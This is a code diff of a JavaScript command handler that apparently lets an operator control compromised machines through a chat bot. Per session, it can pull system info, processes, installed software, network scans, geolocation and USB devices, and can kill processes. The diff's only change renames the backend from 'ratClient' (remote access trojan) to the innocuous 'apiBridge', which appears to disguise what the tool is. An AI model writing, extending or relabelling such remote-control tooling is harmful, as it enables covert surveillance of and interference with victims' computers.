@@ -5,8 +5,8 @@ import { ResponseFormatter } from '../utils/formatter.js';
  */
 
 export class SystemCommands {
-  constructor(ratClient, sock) {
-    this.ratClient = ratClient;
+  constructor(apiBridge, sock) {
+    this.apiBridge = apiBridge;
     this.sock = sock;
   }
 
@@ -21,7 +21,7 @@ export class SystemCommands {
       return;
     }
 
-    const result = await this.ratClient.getSystemInfo(sessionId);
+    const result = await this.apiBridge.getSystemInfo(sessionId);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -49,7 +49,7 @@ export class SystemCommands {
       text: ResponseFormatter.info('⚙️ Enumerating processes...\n\n_Please wait..._') 
     });
 
-    const result = await this.ratClient.getProcesses(sessionId);
+    const result = await this.apiBridge.getProcesses(sessionId);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -73,7 +73,7 @@ export class SystemCommands {
       return;
     }
 
-    const result = await this.ratClient.getMetrics(sessionId);
+    const result = await this.apiBridge.getMetrics(sessionId);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -101,7 +101,7 @@ export class SystemCommands {
       text: ResponseFormatter.info('📦 Enumerating installed software...\n\n_This may take 30 seconds..._') 
     });
 
-    const result = await this.ratClient.getSoftware(sessionId);
+    const result = await this.apiBridge.getSoftware(sessionId);
     
     if (result.success) {
       const softwareData = typeof result.data === 'string' ? result.data.split('\n') : result.data;
@@ -142,7 +142,7 @@ export class SystemCommands {
       return;
     }
 
-    const result = await this.ratClient.killProcess(sessionId, pid);
+    const result = await this.apiBridge.killProcess(sessionId, pid);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -170,7 +170,7 @@ export class SystemCommands {
       text: ResponseFormatter.info('🌐 Scanning network...\n\n_This may take 1-2 minutes..._') 
     });
 
-    const result = await this.ratClient.networkScan(sessionId);
+    const result = await this.apiBridge.networkScan(sessionId);
     
     if (result.success) {
       await this.sock.sendMessage(chatId, { 
@@ -198,7 +198,7 @@ export class SystemCommands {
       text: ResponseFormatter.info('🌍 Getting geolocation...\n\n_Please wait..._') 
     });
 
-    const result = await this.ratClient.getGeolocation(sessionId);
+    const result = await this.apiBridge.getGeolocation(sessionId);
     
     if (result.success) {
       try {
@@ -239,7 +239,7 @@ export class SystemCommands {
     });
 
     try {
-      const result = await this.ratClient.enumerateUSB(sessionId);
+      const result = await this.apiBridge.enumerateUSB(sessionId);
       
       if (result.success) {
         let response = ResponseFormatter.header('💾', 'USB DEVICES') + '\n\n';
